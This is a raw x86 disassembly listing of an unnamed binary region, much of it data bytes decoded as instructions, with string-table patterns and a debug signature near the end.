  43344c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b2],cl
  433453:	cmp    ch,al
  433455:	jne    0x43344a
  433457:	mov    edi,edi
  433459:	fadd   QWORD PTR [ebp+0x0]
  43345c:	mov    eax,edi
  43345e:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb6]
  433465:	mov    edx,DWORD PTR [ebx]
  433467:	in     al,0x45
  433469:	or     DWORD PTR [ebx],esi
  43346b:	iret   
  43346c:	add    ecx,DWORD PTR [eax+edx*2+0x4532184a]
  433473:	xor    dl,BYTE PTR [eax-0x75]
  433476:	sbb    al,0xe0
  433478:	dec    DWORD PTR [ecx]
  43347a:	mov    ecx,edi
  43347c:	in     al,dx
  43347d:	mov    eax,es
  43347f:	dec    edx
  433480:	mov    DWORD PTR [edx],esi
  433482:	fmul   QWORD PTR [edx]
  433484:	jne    0x433411
  433486:	(bad)  
  433487:	(bad)  
  433489:	or     DWORD PTR [ebp-0x31],eax
  43348c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b2]
  433493:	cmp    bh,bh
  433495:	jne    0x4334dc
  433497:	lea    ecx,[ebx-0x38372750]
  43349d:	inc    ebx
  43349f:	mov    eax,ecx
  4334a1:	mov    eax,0xa00c111
  4334a6:	jne    0x4334ed
  4334a8:	mov    esi,DWORD PTR [ebx]
  4334aa:	test   al,0x3
  4334ac:	inc    ebp
  4334ad:	mov    DWORD PTR [eax-0xc],edx
  4334b0:	loop   0x4334f7
  4334b2:	push   DWORD PTR [ebx]
  4334b4:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4334ba:	add    DWORD PTR [eax],eax
  4334bc:	mov    eax,edi
  4334be:	lods   al,BYTE PTR ds:[esi]
  4334bf:	dec    ebp
  4334c0:	inc    ebp
  4334c1:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4334c7:	retf   
  4334c8:	mov    edx,ecx
  4334ca:	adc    al,0x84
  4334cc:	(bad)  
  4334cd:	std    
  4334ce:	ret    
  4334cf:	jmp    FWORD PTR [edi-0x2b7474bb]
  4334d5:	hlt    
  4334d6:	rol    edi,0x82
  4334d9:	ret    
  4334da:	cld    
  4334db:	enter  0x11ff,0x45
  4334df:	inc    ebp
  4334e0:	pop    edi
  4334e1:	mov    ebx,DWORD PTR [ebx+0x14]
  4334e4:	ret    0xc7
  4334e7:	test   BYTE PTR [ebx+0x4532519a],cl
  4334ed:	jmp    0x43347a
  4334ef:	push   0x8
  4334f1:	call   DWORD PTR [esi]
  4334f3:	in     al,dx
  4334f4:	add    BYTE PTR [ebp+0x1],0x50
  4334f8:	add    bh,ah
  4334fa:	add    bh,bh
  4334fc:	icebp  
  4334fd:	mov    ecx,DWORD PTR [eax]
  4334ff:	cld    
  433500:	pop    es
  433501:	dec    ebp
  433502:	shl    DWORD PTR [ebx],0x72
  433505:	add    eax,DWORD PTR [eax]
  433507:	cmp    edx,ecx
  433509:	je     0x43351b
  43350b:	mov    esi,DWORD PTR [ebp-0x4]
  43350e:	inc    edi
  433510:	or     al,0xc3
  433512:	jmp    FWORD PTR [edx-0x18]
  433515:	(bad)  
  433516:	sti    
  433517:	cwde   
  433518:	(bad)  
  433519:	call   0xffa12e24
  43351e:	or     al,0x45
  433520:	push   ebp
  433521:	sub    esp,0x18
  433524:	push   ebx
  433525:	inc    ebp
  433526:	mov    edi,edi
  433528:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43352f:	test   al,0x53
  433531:	inc    ebp
  433532:	push   ecx
  433533:	push   eax
  433534:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43353a:	add    ah,bh
  43353c:	(bad)  
  43353d:	dec    ebp
  43353e:	add    DWORD PTR [ebx],esi
  433540:	inc    ebp
  433541:	add    ecx,DWORD PTR [ebx+0x74943b]
  433547:	push   0xffffff8b
  433549:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43354f:	add    eax,DWORD PTR [ecx]
  433551:	or     BYTE PTR [eax],al
  433553:	call   0xff852d58
  433558:	mov    eax,DWORD PTR [ebp+0x14]
  43355b:	mov    ecx,DWORD PTR [ecx+0x801ac]
  433561:	inc    ebp
  433562:	dec    ecx
  433563:	add    ebp,DWORD PTR [edx+0x14]
  433566:	push   0x8b3045
  43356b:	call   0x33ad82e0
  433570:	inc    DWORD PTR [ebx]
  433572:	mov    DWORD PTR [edi],ecx
  433574:	mov    eax,ecx
  433576:	or     BYTE PTR [ebp-0x3d],cl
  433579:	cmp    eax,edi
  43357b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  433580:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433586:	adc    al,0xc9
  433588:	inc    ebp
  433589:	adc    BYTE PTR [eax+0x55],dl
  43358c:	jne    0x43357a
  43358e:	call   0xff54351e
  433593:	dec    ebp
  433594:	inc    ebp
  433595:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43359b:	add    BYTE PTR [ebx],bh
  43359d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335a1:	push   ebx
  4335a2:	or     al,0x51
  4335a4:	dec    ebp
  4335a5:	xor    DWORD PTR [ebx],0xf32039a
  4335ab:	cmp    eax,DWORD PTR [ebp+0x74]
  4335ae:	mov    edi,edi
  4335b0:	pop    edi
  4335b1:	adc    BYTE PTR [ebx+0x75],bl
  4335b4:	ret    0x50
  4335b7:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4335bb:	(bad)  
  4335bc:	clc    
  4335bd:	mov    esp,ebp
  4335bf:	pop    ecx
  4335c0:	mov    ecx,0xf80085c2
  4335c5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4335c8:	push   esi
  4335c9:	push   esi
  4335ca:	(bad)  
  4335cb:	lock inc DWORD PTR [ebp+0x44]
  4335cf:	mov    edx,DWORD PTR [eax]
  4335d1:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4335d5:	or     BYTE PTR [ebx+0x7],dl
  4335d8:	push   ecx
  4335d9:	ret    
  4335da:	xor    ebx,DWORD PTR [edx+0x37232be]
  4335e0:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4335e6:	or     al,0x80
  4335e8:	jge    0x4335eb
  4335ea:	mov    DWORD PTR [eax],eax
  4335ec:	and    al,0x8
  4335ee:	cmp    DWORD PTR [ebp+0x10],eax
  4335f1:	mov    edx,DWORD PTR [esi]
  4335f3:	xchg   esp,eax
  4335f4:	dec    esp
  4335f5:	add    BYTE PTR [eax],dl
  4335f7:	mov    ecx,edx
  4335f9:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4335fd:	dec    ebp
  4335fe:	into   
  4335ff:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433605:	mov    edx,DWORD PTR [eax+0x14]
  433608:	das    
  433609:	add    al,0x45
  43360b:	add    BYTE PTR [ebp+0x0],dh
  43360e:	mov    edi,edi
  433610:	and    al,0x50
  433612:	mov    eax,DWORD PTR [eax]
  433614:	and    al,0xd1
  433616:	xor    eax,DWORD PTR [esi]
  433618:	lea    eax,[ebp+0x8]
  43361b:	xor    esi,DWORD PTR [edx+0x3]
  43361e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433624:	cmp    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43362a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433634:	cmp    bh,bh
  433636:	pushf  
  433637:	mov    edi,edi
  433639:	or     BYTE PTR [esi+ecx*1],cl
  43363c:	jne    0x433601
  43363e:	call   0xc360a
  433643:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433647:	mov    ebx,DWORD PTR [eax]
  433649:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43364d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433655:	pop    esi
  433656:	jmp    0x433621
  433658:	and    al,0x10
  43365a:	and    al,0x55
  43365c:	or     ah,ch
  43365e:	and    al,0xe4
  433660:	inc    DWORD PTR [ebx+0x35e81024]
  433666:	(bad)  
  433667:	pushf  
  433668:	dec    DWORD PTR [ecx+0x570c2444]
  43366e:	pop    esi
  43366f:	inc    ecx
  433670:	in     eax,0x89
  433672:	ret    0x24
  433675:	mov    edi,eax
  433677:	and    al,0x7d
  433679:	mov    edx,0x768089c
  43367e:	clc    
  43367f:	cli    
  433680:	call   FWORD PTR [edx+0x3893274]
  433686:	dec    DWORD PTR [ecx-0x74e7db01]
  43368c:	adc    al,0xc
  43368e:	(bad)  
  43368f:	jl     0x4336b5
  433691:	adc    al,0x8b
  433693:	dec    ebp
  433694:	or     al,0x75
  433696:	jmp    0x433623
  433698:	adc    BYTE PTR [esp+eax*2],ah
  43369b:	xor    ecx,DWORD PTR [ebx+ecx*4-0x3e]
  43369f:	and    al,0x9a
  4336a1:	add    ecx,DWORD PTR [ecx+0xeca680f]
  4336a7:	dec    esp
  4336a8:	jne    0x4336b2
  4336aa:	jne    0x4336e5
  4336ac:	call   FWORD PTR [ecx*4-0x74ef8bf8]
  4336b3:	test   BYTE PTR [ebp+0x32],bl
  4336b6:	and    al,0x85
  4336b8:	cmp    eax,DWORD PTR [ebp-0x408bdbf8]
  4336be:	pop    edi
  4336bf:	(bad)  
  4336c0:	sbb    edx,DWORD PTR [eax]
  4336c2:	add    dl,dl
  4336c4:	cmp    edx,DWORD PTR [eax]
  4336c6:	add    BYTE PTR [esi+0x7e],al
  4336c9:	adc    BYTE PTR [eax],al
  4336cb:	mov    eax,ds:0x1c00107e
  4336d0:	push   edx
  4336d1:	adc    BYTE PTR [eax],al
  4336d3:	cli    
  4336d4:	push   ss
  4336d5:	adc    BYTE PTR [eax],al
  4336d7:	lahf   
  4336d8:	adc    edx,DWORD PTR [eax]
  4336da:	add    BYTE PTR [eax+eiz*2+0x10],ah
  4336de:	add    BYTE PTR [edi+0x19001004],ah
  4336e4:	inc    eax
  4336e5:	adc    BYTE PTR [eax],al
  4336e7:	ds jge 0x4336fa
  4336ea:	add    BYTE PTR [edi-0x3cffbcca],bh
  4336f0:	ss inc ebx
  4336f2:	add    bh,al
  4336f4:	ss inc ebx
  4336f6:	add    bl,cl
  4336f8:	ss inc ebx
  4336fa:	add    bh,cl
  4336fc:	ss inc ebx
  4336fe:	add    bl,dl
  433700:	ss inc ebx
  433702:	add    bh,dl
  433704:	ss inc ebx
  433706:	add    bl,bl
  433708:	ss inc ebx
  43370a:	add    bh,bl
  43370c:	ss inc ebx
  43370e:	add    bl,ah
  433710:	ss inc ebx
  433712:	add    bh,ah
  433714:	ss inc ebx
  433716:	add    BYTE PTR [ecx],ah
  433718:	jno    0x43372a
  43371a:	add    BYTE PTR [esi+ebp*2+0x6dca0010],ah
  433721:	adc    BYTE PTR [eax],al
  433723:	ja     0x433795
  433725:	adc    BYTE PTR [eax],al
  433727:	xor    BYTE PTR [edx+0x10],0x0
  43372b:	loopne 0x43379b
  43372d:	adc    BYTE PTR [eax],al
  43372f:	cmp    BYTE PTR [eax+0x10],dl
  433732:	add    BYTE PTR ds:0x1700104f,al
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [ebx],dh
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ecx],al
  433758:	add    BYTE PTR [eax],dl
  43375a:	add    al,ah
  43375c:	pop    ebp
  43375d:	adc    BYTE PTR [eax],al
  43375f:	add    ah,BYTE PTR ds:0x328d0010
  433765:	adc    BYTE PTR [eax],al
  433767:	xchg   DWORD PTR [ecx],edx
  433769:	adc    BYTE PTR [eax],al
  43376b:	ja     0x433779
  43376d:	adc    BYTE PTR [eax],al
  43376f:	add    cl,BYTE PTR [eax]
  433771:	adc    BYTE PTR [eax],al
  433773:	jle    0x4337e9
  433775:	adc    BYTE PTR [eax],al
  433777:	push   edi
  433778:	aaa    
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [esi+0x12],bl
  433799:	adc    BYTE PTR [eax],al
  43379b:	stc    
  43379c:	push   es
  43379d:	adc    BYTE PTR [eax],al
  43379f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4337a0:	xor    DWORD PTR [eax],edx
  4337a2:	add    BYTE PTR [eax+0x7b],dl
  4337a5:	adc    BYTE PTR [eax],al
  4337a7:	stos   DWORD PTR es:[edi],eax
  4337a8:	push   edi
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	inc    ebp
  4337ac:	adc    edx,DWORD PTR [eax]
  4337ae:	add    BYTE PTR [eax+0x38],ch
  4337b1:	adc    BYTE PTR [eax],al
  4337b3:	pop    ecx
  4337b4:	and    edx,DWORD PTR [eax]
  4337b6:	add    BYTE PTR [edi-0x64ffbcc9],dl
  4337bc:	aaa    
  4337bd:	inc    ebx
  4337be:	add    BYTE PTR [edi-0x5cffbcc9],bl
  4337c4:	aaa    
  4337c5:	inc    ebx
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi-0x4cffbcc9],ch
  4337d4:	aaa    
  4337d5:	inc    ebx
  4337d6:	add    BYTE PTR [ecx+0x72],cl
  4337d9:	adc    BYTE PTR [eax],al
  4337db:	cmp    edi,DWORD PTR [eax+0x10]
  4337de:	add    BYTE PTR [ebx+0x23],dl
  4337e1:	adc    BYTE PTR [eax],al
  4337e3:	jno    0x433851
  4337e5:	adc    BYTE PTR [eax],al
  4337e7:	pop    eax
  4337e8:	outs   dx,BYTE PTR ds:[esi]
  4337e9:	adc    BYTE PTR [eax],al
  4337eb:	mov    ebx,DWORD PTR [ebx+0x10]
  4337ee:	add    BYTE PTR [ebx+ebx*2],ch
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	retf   0x1066
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    bl,dh
  433814:	aaa    
  433815:	inc    ebx
  433816:	add    BYTE PTR [ebx+0x32],al
  433819:	xor    dh,BYTE PTR ds:0x5a52345f
  43381f:	push   esp
  433820:	xor    BYTE PTR [esi],dh
  433822:	add    BYTE PTR [ecx+0x36],cl
  433825:	push   eax
  433826:	pop    edi
  433827:	ss inc ebx
  433829:	ss pop edx
  43382b:	xor    ebx,DWORD PTR [edi+0x52]
  43382e:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433832:	pop    edi
  433833:	dec    esi
  433834:	dec    esp
  433835:	dec    eax
  433836:	xor    esi,DWORD PTR [edx]
  433838:	pop    edi
  433839:	xor    al,0x4b
  43383b:	add    BYTE PTR [eax+0x49],cl
  43383e:	push   ebp
  43383f:	xor    al,0x5f
  433841:	dec    esp
  433842:	inc    edx
  433843:	dec    ecx
  433844:	cmp    DWORD PTR [edi+ebx*2],esi
  433847:	pop    ecx
  433848:	inc    edi
  433849:	add    BYTE PTR [eax+0x50],bl
  43384c:	dec    eax
  43384d:	pop    edi
  43384e:	push   ebp
  43384f:	push   ecx
  433850:	inc    edi
  433851:	xor    cl,BYTE PTR [edx+0x38]
  433854:	push   esi
  433855:	add    BYTE PTR [ebx+0x4a],al
  433858:	push   edx
  433859:	pop    edi
  43385a:	dec    edi
  43385b:	dec    eax
  43385c:	dec    edi
  43385d:	dec    edi
  43385e:	dec    edx
  43385f:	add    BYTE PTR [ecx+0x52],al
  433862:	cmp    DWORD PTR [edi+0x56],ebx
  433865:	aaa    
  433866:	dec    esp
  433867:	cmp    DWORD PTR [ebx+0x5f],eax
  43386a:	push   edx
  43386b:	inc    esp
  43386c:	add    BYTE PTR [ecx+0x37],bl
  43386f:	inc    esp
  433870:	pop    edi
  433871:	dec    ecx
  433872:	xor    esi,DWORD PTR [edi]
  433874:	xor    DWORD PTR [edi+0x49],ebx
  433877:	push   esp
  433878:	xor    eax,DWORD PTR [eax]
  43387a:	push   edx
  43387b:	xor    BYTE PTR [eax+0x5f],bl
  43387e:	dec    eax
  43387f:	push   edi
  433880:	inc    esi
  433881:	xor    DWORD PTR [edi+0x5f],edx
  433884:	cmp    BYTE PTR [ebx+0x37],dl
  433887:	add    BYTE PTR [esi+0x42],dl
  43388a:	dec    ecx
  43388b:	xor    ebx,DWORD PTR [edi+0x45]
  43388e:	xor    BYTE PTR [ebp+0x5f],cl
  433891:	xor    al,0x34
  433893:	xor    BYTE PTR [edx+0x5f],cl
  433896:	inc    edi
  433897:	add    BYTE PTR [edx+0x57],dl
  43389a:	xor    ebx,DWORD PTR [edi+0x31]
  43389d:	dec    edx
  43389e:	push   edi
  43389f:	xor    eax,0x4d435f
  4338a4:	dec    ecx
  4338a5:	xor    eax,0x36365f39
  4338aa:	dec    eax
  4338ab:	xor    BYTE PTR [eax],al
  4338ad:	dec    edi
  4338ae:	inc    ebx
  4338af:	push   edi
  4338b0:	pop    edi
  4338b1:	inc    edi
  4338b2:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4338b7:	add    BYTE PTR [edx+0x58],al
  4338ba:	inc    edi
  4338bb:	ss pop edi
  4338bd:	push   esi
  4338be:	inc    ebx
  4338bf:	dec    esi
  4338c0:	inc    esp
  4338c1:	add    BYTE PTR [edi+0x4d],cl
  4338c4:	inc    edi
  4338c5:	xor    ebx,DWORD PTR [edi+0x34]
  4338c8:	dec    esi
  4338c9:	pop    edx
  4338ca:	cmp    BYTE PTR [edi+0x58],bl
  4338cd:	cmp    BYTE PTR [eax],al
  4338cf:	push   edx
  4338d0:	pop    eax
  4338d1:	push   ecx
  4338d2:	pop    edi
  4338d3:	dec    esp
  4338d4:	push   edx
  4338d5:	dec    ecx
  4338d6:	dec    edi
  4338d7:	inc    esp
  4338d8:	pop    edi
  4338d9:	dec    edi
  4338da:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  4338de:	push   eax
  4338df:	inc    ebp
  4338e0:	pop    edi
  4338e1:	xor    eax,0x565f3945
  4338e6:	add    BYTE PTR [edi+0x4e],al
  4338e9:	push   esi
  4338ea:	pop    edi
  4338eb:	inc    edi
  4338ec:	push   esp
  4338ed:	dec    eax
  4338ee:	xor    dh,BYTE PTR [ecx]
  4338f0:	pop    edi
  4338f1:	dec    edi
  4338f2:	xor    eax,DWORD PTR ss:[eax]
  4338f5:	inc    esp
  4338f6:	inc    ebp
  4338f7:	dec    ecx
  4338f8:	pop    edi
  4338f9:	push   edx
  4338fa:	dec    eax
  4338fb:	xor    al,0x48
  4338fd:	dec    ecx
  4338fe:	ss pop edi
  433900:	aaa    
  433901:	aaa    
  433902:	dec    ecx
  433903:	dec    ebp
  433904:	add    BYTE PTR [eax+0x54],cl
  433907:	ss pop edi
  433909:	inc    esi
  43390a:	inc    edx
  43390b:	xor    dh,BYTE PTR [eax+eax*1]
  43390e:	dec    esi
  43390f:	ss dec edx
  433911:	pop    edi
  433912:	dec    ecx
  433913:	dec    esp
  433914:	inc    edi
  433915:	inc    esp
  433916:	dec    eax
  433917:	xor    BYTE PTR [eax],bh
  433919:	xor    eax,0x4c344f00
  43391e:	xor    esi,DWORD PTR [edi]
  433920:	xor    BYTE PTR [edi+0x44],bl
  433923:	inc    edi
  433924:	dec    ebx
  433925:	xor    al,BYTE PTR [ecx+0x43]
  433928:	add    BYTE PTR [edi+0x32],cl
  43392b:	xor    ebx,DWORD PTR [edi+0x57]
  43392e:	xor    cl,BYTE PTR [edi+0x5f]
  433931:	pop    edx
  433932:	add    BYTE PTR [eax+0x4c],bl
  433935:	cmp    DWORD PTR [edi+0x4b],ebx
  433938:	inc    ecx
  433939:	dec    edx
  43393a:	inc    esi
  43393b:	xor    DWORD PTR [edi+ebx*2],esi
  43393e:	pop    eax
  43393f:	inc    edi
  433940:	inc    edx
  433941:	add    BYTE PTR [eax+0x33],dl
  433944:	dec    esi
  433945:	pop    edi
  433946:	dec    eax
  433947:	xor    eax,0x485f53
  43394c:	dec    ebp
  43394d:	xor    BYTE PTR [edx+0x5f],al
  433950:	dec    edx
  433951:	pop    eax
  433952:	push   esp
  433953:	dec    ecx
  433954:	dec    esp
  433955:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  433959:	xor    esi,DWORD PTR [eax]
  43395b:	pop    edi
  43395c:	inc    ecx
  43395d:	pop    edx
  43395e:	push   ecx
  43395f:	pop    edx
  433960:	cmp    DWORD PTR [esi],esi
  433962:	pop    edi
  433963:	dec    eax
  433964:	dec    esp
  433965:	pop    edx
  433966:	add    BYTE PTR [ecx+0x57],dl
  433969:	pop    ecx
  43396a:	pop    edi
  43396b:	push   esi
  43396c:	xor    al,0x44
  43396e:	xor    DWORD PTR [eax],edi
  433970:	xor    bl,BYTE PTR [edi+0x39]
  433973:	push   esp
  433974:	push   esp
  433975:	add    BYTE PTR [esi+0x0],dl
  433978:	dec    edi
  433979:	add    BYTE PTR [edi+0x0],al
  43397c:	add    BYTE PTR ss:[edi+0x0],bl
  433980:	dec    edi
  433981:	add    BYTE PTR [edx+0x0],bl
  433984:	inc    ebp
  433985:	add    BYTE PTR [eax],dh
  433987:	add    BYTE PTR [ebp+0x0],al
  43398a:	xor    BYTE PTR [eax],al
  43398c:	pop    edi
  43398d:	add    BYTE PTR [eax],dh
  43398f:	add    BYTE PTR ds:0x4f000000,dh
  433995:	add    BYTE PTR ds:0x5f005700,dh
  43399b:	add    BYTE PTR [edi],dh
  43399d:	add    BYTE PTR [ebx+0x0],dl
  4339a0:	push   ebp
  4339a1:	add    BYTE PTR [edi+0x0],al
  4339a4:	xor    al,0x0
  4339a6:	pop    edi
  4339a7:	add    BYTE PTR [ecx+0x0],dl
  4339aa:	inc    esp
  4339ab:	add    BYTE PTR [eax],al
  4339ad:	add    BYTE PTR [edx+0x0],dl
  4339b0:	push   esp
  4339b1:	add    BYTE PTR ds:0x52005f00,dh
  4339b7:	add    BYTE PTR [edi+0x0],dl
  4339ba:	xor    al,BYTE PTR [eax]
  4339bc:	xor    al,BYTE PTR [eax]
  4339be:	xor    BYTE PTR [eax],al
  4339c0:	xor    BYTE PTR [eax],al
  4339c2:	pop    edi
  4339c3:	add    BYTE PTR [esi],dh
  4339c5:	add    BYTE PTR [eax],al
  4339c7:	add    BYTE PTR [eax+0x0],cl
  4339ca:	inc    ebp
  4339cb:	add    BYTE PTR [eax+eax*1+0x30],cl
  4339cf:	add    BYTE PTR [edi+0x0],bl
  4339d2:	dec    edx
  4339d3:	add    BYTE PTR [edx],dh
  4339d5:	add    BYTE PTR [edi],dh
  4339d7:	add    BYTE PTR [ebp+0x0],dl
  4339da:	add    BYTE PTR ss:[eax],dh
  4339dd:	add    BYTE PTR [eax],al
  4339df:	add    BYTE PTR [esi+0x0],dl
  4339e2:	cmp    BYTE PTR [eax],al
  4339e4:	dec    edi
  4339e5:	add    BYTE PTR [ecx],bh
  4339e7:	add    BYTE PTR [edi+0x0],bl
  4339ea:	pop    eax
  4339eb:	add    BYTE PTR [edx+0x0],bl
  4339ee:	dec    esp
  4339ef:	add    BYTE PTR [ebx+0x0],cl
  4339f2:	add    BYTE PTR [eax],al
  4339f4:	dec    ecx
  4339f5:	add    BYTE PTR [ebp+0x0],dl
  4339f8:	dec    edi
  4339f9:	add    BYTE PTR [eax],bh
  4339fb:	add    BYTE PTR [edi+0x0],bl
  4339fe:	inc    esp
  4339ff:	add    BYTE PTR [eax],bh
  433a01:	add    BYTE PTR [ecx+0x0],cl
  433a04:	dec    eax
  433a05:	add    BYTE PTR [edi+0x0],cl
  433a08:	pop    edi
  433a09:	add    BYTE PTR [ebp+0x0],al
  433a0c:	pop    eax
  433a0d:	add    BYTE PTR [eax],al
  433a0f:	add    BYTE PTR [edx+0x0],dl
  433a12:	dec    esp
  433a13:	add    BYTE PTR [esi],dh
  433a15:	add    BYTE PTR [edi+0x0],bl
  433a18:	aaa    
  433a19:	add    BYTE PTR [eax+0x0],bl
  433a1c:	xor    eax,DWORD PTR [eax]
  433a1e:	inc    edi
  433a1f:	add    BYTE PTR [ecx+0x0],dl
  433a22:	pop    edi
  433a23:	add    BYTE PTR [edx+0x0],cl
  433a26:	add    BYTE PTR [eax],al
  433a28:	inc    edi
  433a29:	add    BYTE PTR [edi+0x0],cl
  433a2c:	push   ebx
  433a2d:	add    BYTE PTR [eax+eax*1],dh
  433a30:	pop    edi
  433a31:	add    BYTE PTR [ecx+0x0],cl
  433a34:	xor    DWORD PTR [eax],eax
  433a36:	push   esi
  433a37:	add    BYTE PTR [ebx],dh
  433a39:	add    BYTE PTR [edi+0x0],bl
  433a3c:	dec    ecx
  433a3d:	add    BYTE PTR [edx+0x0],bl
  433a40:	add    BYTE PTR [eax],al
  433a42:	inc    ebx
  433a43:	add    BYTE PTR [ecx+0x0],bl
  433a46:	inc    ecx
  433a47:	add    BYTE PTR [eax],dh
  433a49:	add    BYTE PTR [ecx],bh
  433a4b:	add    BYTE PTR [edi+0x0],bl
  433a4e:	cmp    DWORD PTR [eax],eax
  433a50:	push   eax
  433a51:	add    BYTE PTR [eax+eax*1],dh
  433a54:	pop    edx
  433a55:	add    BYTE PTR [eax],al
  433a57:	add    BYTE PTR [edx+0x0],al
  433a5a:	inc    esi
  433a5b:	add    BYTE PTR [eax+eax*1+0x5f],dl
  433a5f:	add    BYTE PTR [ebp+0x0],dl
  433a62:	push   ebp
  433a63:	add    BYTE PTR [eax+eax*1+0x57],dl
  433a67:	add    BYTE PTR [eax],al
  433a69:	add    BYTE PTR [eax+eax*1+0x37],dl
  433a6d:	add    BYTE PTR [eax+eax*1+0x38],dl
  433a71:	add    BYTE PTR [edi+0x0],bl
  433a74:	xor    eax,DWORD PTR [eax]
  433a76:	cmp    DWORD PTR [eax],eax
  433a78:	dec    eax
  433a79:	add    BYTE PTR [edi+0x0],bl
  433a7c:	dec    ebp
  433a7d:	add    BYTE PTR [ecx+0x0],bl
  433a80:	cmp    DWORD PTR [eax],eax
  433a82:	inc    ecx
  433a83:	add    BYTE PTR [esi+0x0],cl
  433a86:	add    BYTE PTR [eax],al
  433a88:	inc    ebx
  433a89:	add    BYTE PTR [eax+0x0],dl
  433a8c:	dec    esi
  433a8d:	add    BYTE PTR [eax+eax*1],dh
  433a90:	pop    edi
  433a91:	add    BYTE PTR [eax+eax*1+0x54],cl
  433a95:	add    BYTE PTR [ebx+0x0],cl
  433a98:	xor    DWORD PTR [eax],eax
  433a9a:	add    BYTE PTR [eax],al
  433a9c:	inc    ecx
  433a9d:	add    BYTE PTR [edi],dh
  433a9f:	add    BYTE PTR [edx+0x0],cl
  433aa2:	pop    edi
  433aa3:	add    BYTE PTR [ebx+0x0],al
  433aa6:	cmp    BYTE PTR [eax],al
  433aa8:	push   edi
  433aa9:	add    BYTE PTR [eax+0x0],dl
  433aac:	pop    edi
  433aad:	add    BYTE PTR [eax+eax*1+0x4e],cl
  433ab1:	add    BYTE PTR [edx],dh
  433ab3:	add    BYTE PTR [eax],al
  433ab5:	add    BYTE PTR [edx+0x0],al
  433ab8:	add    BYTE PTR [eax],al
  433aba:	push   edx
  433abb:	push   ebx
  433abc:	inc    esp
  433abd:	push   ebx
  433abe:	pop    ebx
  433abf:	enter  0xaa54,0xf2
  433ac3:	dec    edi
  433ac4:	enter  0xb349,0x2d
  433ac8:	mov    DWORD PTR [ebx],ebx
  433aca:	and    BYTE PTR [edx+0x13b2b5],bl
  433ad0:	add    BYTE PTR [eax],al
  433ad2:	dec    edi
  433ad3:	cmp    bl,BYTE PTR [ecx+esi*2+0x54]
  433ad7:	inc    esp
  433ad8:	jp     0x433b28
  433ada:	jb     0x433b36
  433adc:	addr16 jne 0x433b42
  433adf:	jns    0x433b51
  433ae1:	jbe    0x433b3f
  433ae3:	push   0x62
  433ae5:	push   edi
  433ae6:	jns    0x433b60
  433ae8:	inc    ebp
  433ae9:	ins    DWORD PTR es:[edi],dx
  433aea:	jbe    0x433b53
  433aec:	popa   
  433aed:	pop    esp
  433aee:	je     0x433b5a
  433af0:	pop    edx
  433af1:	data16 jne 0x433b66
  433af4:	ja     0x433b5e
  433af6:	push   edx
  433af7:	bound  eax,QWORD PTR [ebp+0x72]
  433afa:	pop    esp
  433afb:	dec    edx
  433afc:	jae    0x433b42
  433afe:	ins    DWORD PTR es:[edi],dx
  433aff:	imul   ebp,DWORD PTR [eax+0x62],0x2e
  433b03:	jo     0x433b69
  433b05:	bound  eax,QWORD PTR [eax]
	...
